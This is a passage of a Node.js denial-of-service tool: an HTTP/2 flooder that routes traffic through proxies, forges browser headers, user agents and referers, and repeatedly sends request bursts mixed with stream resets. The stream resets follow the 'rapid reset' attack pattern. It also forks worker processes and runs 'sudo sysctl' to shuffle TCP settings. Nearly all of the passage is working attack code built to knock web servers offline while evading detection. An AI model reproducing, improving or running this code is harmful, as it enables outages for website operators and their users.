                       } else if (randrate === "true") {
                       rate = getRandomInt(1, 128);
                       } else if (randrate !== "") {
                       try {
                       const base_rate = parseInt(randrate);
                       const range = rate_range(base_rate, 50);
                       rate = getRandomInt(range.min, range.max);
                       } catch (err) {
                       rate = getRandomInt(1, 90);
                       }
                       }
                       return rate;
                       }

    
                       var rate = calculateRate();
                       for (var x = 0; x < rate; x++) {

                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        const browserVersion = getRandomInt(128, 134);
                         var brandValue, versionList, fullVersion;
                         switch (browserVersion) {
            case 126:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 127:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 128:
                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
            case 129:
                brandValue = `\"Google Chrome\";v=\"${browserVersion}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
                break;
            case 130:
                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                break;
            default:
                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"Google Chrome\";v=\"${browserVersion}\"`;
                fullVersion = `${browserVersion}.0.${getRandomInt(6610, 6690)}.${getRandomInt(10, 100)}`;
                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
                break;
                    }
                    const isBrave = versionList.includes('Brave');


                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const langValue = isBrave
                            ? 'en-US,en;q=0.9'
                            : 'en-US,en;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        const generateUserAgent = () => {
                        const getRandomItem = (arr) => arr[Math.floor(Math.random() * arr.length)];
                        const browsers = [
                        { name: "Chrome", versions: ["91.0", "92.0", "93.0", "94.0", "95.0"] },
                        { name: "Firefox", versions: ["89.0", "90.0", "91.0", "92.0"] },
                        { name: "Safari", versions: ["14.1", "15.0", "15.1", "16.0"] },
                        { name: "Edge", versions: ["91.0", "92.0", "93.0"] },
                        { name: "Opera", versions: ["78.0", "79.0", "80.0"] },
                        { name: "Internet Explorer", versions: ["11.0", "10.0"] }
                        ];
                        
                        const devices = [
                        { name: "Pixel 6", platform: "Android", version: "12" },
                        { name: "iPhone 13", platform: "iOS", version: "15" },
                        { name: "Samsung Galaxy S21", platform: "Android", version: "11" },
                        { name: "MacBook Pro", platform: "macOS", version: "Monterey" },
                        { name: "Windows 10 PC", platform: "Windows", version: "10" },
                        ];
                        
                        const engines = [
                        { name: "Blink", versions: ["91", "92", "93"] },
                        { name: "Gecko", versions: ["89", "90", "91"] },
                        { name: "WebKit", versions: ["604", "605", "606"] },
                        ];
                        
                        const osList = [
                        "Linux", "Windows 10", "macOS Monterey", "iOS 15", "Android 12", "Ubuntu 20.04", "Fedora 34"
                        ];
                        
                        
                        const features = [
                        { name: "WebGL", version: "1.0" },
                        { name: "Service Worker", version: "1.0" },
                        { name: "ES6", version: "2015" },
                        { name: "Canvas", version: "2.0" },
                        
                        ];
                        const browser = getRandomItem(browsers);
                        const device = getRandomItem(devices);
                        const engine = getRandomItem(engines);
                        const os = getRandomItem(osList);
                        const feature = getRandomItem(features);
                        return `${browser.name}/${getRandomItem(browser.versions)} ` +`(${device.name}; ${device.platform} ${device.version}; ${os}) ` +`${engine.name}/${getRandomItem(engine.versions)} ` +`(KHTML, like Gecko) ${feature.name}/${feature.version}`;
                        };

                        const secChUa = `${brandValue}`;

                        let randomNum = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;
                        
                        const generateRandomNumber = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
                        const platforms = ["Windows NT 10.0; Win64; x64","Macintosh; Intel Mac OS X 10_15_7","X11; Linux x86_64"];
                        const platform = platforms[Math.floor(Math.random() * platforms.length)];
                        var userAgent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                        
                        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
                        switch (platform) {
                        case "Windows NT 10.0; Win64; x64":
                        secChUaPlatform = "\"Windows\"";
                        sec_ch_ua_arch = "x86";
                        platformVersion = "\"10.0.0\"";
                        break;
                        case "Macintosh; Intel Mac OS X 10_15_7":
                        secChUaPlatform = "\"macOS\"";
                        sec_ch_ua_arch = "arm"
                        platformVersion = "\"14.5.0\"";
                        break;
                        case "X11; Linux x86_64":
                        secChUaPlatform = "\"Linux\"";
                        sec_ch_ua_arch = "x86"
                        platformVersion = "\"5.15.0\"";
                        break;
                        default:
                        secChUaPlatform = "\"Windows\"";
                        sec_ch_ua_arch = "x86";
                        platformVersion = "\"10.0.0\"";
                        break;
                        }
                        var pathname = url.pathname;
                        if (pathname === "") {
                        pathname = "/"
                        }
                        if (pathname.includes('%RAND%')) {
                        pathname = pathname.replace("%RAND%", random_string(random_int(6, 9)));
                        }
                        if (randpath) {
                        const pathname_length = pathname.length;
                        if (pathname[pathname_length-1] !== "/") {
                        pathname = `${pathname}/${random_string(random_int(6, 9))}`;
                        } else {
                        pathname = `${pathname}${random_string(random_int(6, 9))}`;
                        }
                        }
                        var referer;
                        if (refererValue) {
                        const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
                        const extension = extensions[Math.random(Math.floor() * extensions.length)];
                        try {
                        if (refererValue === "RAND") {
                        referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
                        } else {
                        const referer_url = new URL(refererValue);
                        referer = referer_url.href;
                        }
                        } catch (err) {
                        referer = url.href;
                        }
                        }
                        if (randua1) {
                        sd = generateUserAgent()
                        } else {
                        sd = userAgent
                        }
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            
                            ":path": pathname,
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            ...(reqmethod === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
                            "sec-ch-ua": secChUa,
                            ...(cache && { "cache-control": Math.random() < 0.50 ? "max-age=0" : "no-cache" }),
                            "sec-ch-ua-platform": `\"Windows\"`,
                            ...(hcookie && { "cookie": hcookie }),
                            "upgrade-insecure-requests": "1",
                            "priority": 'u=0, i',
                            ...(fullHeaders && { "sec-ch-ua-full-version": fullVersion }),
                            ...(fullHeaders && { "sec-ch-ua-full-version-list": versionList }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": encodings[~~Math.random(Math.floor() * encodings.length)],
                            "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
                            "user-agent": sd,
                            ...(fullHeaders && { "sec-ch-ua-arch": sec_ch_ua_arch }),
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            "sec-ch-ua-platform": secChUaPlatform,
                            ...(fullHeaders && { "sec-ch-ua-bitness": "\"64\"" }),
                            ...(fullHeaders && { "sec-ch-ua-model": "\"\"" }),
                            ...(referer) && { "referer": referer},
                            ...(fullHeaders && { "sec-ch-ua-platform-version": platformVersion }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }));
                             

                        
                  
                        const combinedHeaders = headers;
                        

                        

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);
                        const flags = 0x1 | 0x4 | 0x8 | 0x20;
                        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                        const frame = Buffer.concat([encodedFrame]);
                        if (rapid && (streamId / 2 > rate && streamId >= 5)) {
                            tlsSocket.write(Buffer.concat([encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0)]));
                            } 
                        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
                        const rstStreamFrame = encodeFrame(streamId,  0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0);
                        tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
                        STREAMID_RESET=0;
                        }

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        
    
                        streamId += 2;
                        STREAMID_RESET +=2;

                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        setTimeout(() => {

                        main()
                    }, 700 / rate);
                    })
                }
                main()
            }).on('error', () => {
                tlsSocket.destroy()
            })
            .on('end', () => {
                if (!statuses["CLOSE"]) statuses["CLOSE"] = 0;
                statuses["CLOSE"]++;
            });
        })
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (shouldCloseSession) {
            if (tlsSocket) {
                tlsSocket.end(() => {
                go();
                }).on('timeout', () => {
                    if (!statuses["TIMEOUT"]) statuses["TIMEOUT"] = 0;
                    statuses["TIMEOUT"]++;
                    if (tlsSocket) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        go();
                    }
                })
                
            }
    
    if (netSocket) {
        netSocket.end(() => {
        });
    }
}
    })

    
    netSocket.on('error', (error) => {
        cleanup(error);
    });
    
    netSocket.on('close', () => {
        cleanup();
    });
    
    function cleanup(error) {
        if (error) {
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

const MAX_RAM_PERCENTAGE = 75;
const RESTART_DELAY = 1000;
const getRandomHeapSize = () => {
    const minHeapSize = 512;
    const maxHeapSize = 2048;
    return Math.floor(Math.random() * (maxHeapSize - minHeapSize + 1)) + minHeapSize;
};
const restartScript = () => {
    console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
    for (const id in cluster.workers) {
        if (cluster.workers[id]) {
            cluster.workers[id].on('exit', () => {
            });
            cluster.workers[id].kill('SIGTERM');
        }
    }
    setTimeout(() => {
        console.log('[>] Forking new workers...');
        for (let counter = 1; counter <= threads; counter++) {
            const heapSize = getRandomHeapSize();
            cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
        }
    }, RESTART_DELAY);
};
   const handleRAMUsage = () => {
    const totalRAM = os.totalmem(); 
    const usedRAM = totalRAM - os.freemem(); 
    const ramPercentage = (usedRAM / totalRAM) * 100;

    console.log(`[RAM Check] Total RAM: ${(totalRAM / (1024 ** 3)).toFixed(2)} GB`);
    console.log(`[RAM Check] Used RAM: ${(usedRAM / (1024 ** 3)).toFixed(2)} GB`);
    console.log(`[RAM Check] RAM Usage: ${ramPercentage.toFixed(2)}%`);

    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
        console.log('[!] Maximum RAM usage exceeded:', ramPercentage.toFixed(2), '%');
        restartScript();
    }
};

if (cluster.isMaster) {
for (let counter = 1; counter <= threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
    const workers = {}


    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`SENT`);

    cluster.on('exit', (worker, code, signal) => {
        console.log(`[Worker ${worker.id}] exited. Forking a new worker...`);
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    });

    setInterval(handleRAMUsage, 10000);


    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let connection_of_proxy = 1;
    let active_connection = 0;

function initiateFlood() {
    for (let x = 0; x < connection_of_proxy; x++) {
        const flood_interval = setInterval(() => {
            if (connections !== undefined && connections <= active_connection) {
                clearInterval(flood_interval);
                return;
            }

            if (proxy && proxy.length >= 2) {
                const [proxyHost, proxyPort] = proxy;
                const port = parseInt(proxyPort);
                
                go(proxyHost, port);
                active_connection++;
            }
        }, delay);
    }
}

initiateFlood();





    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}
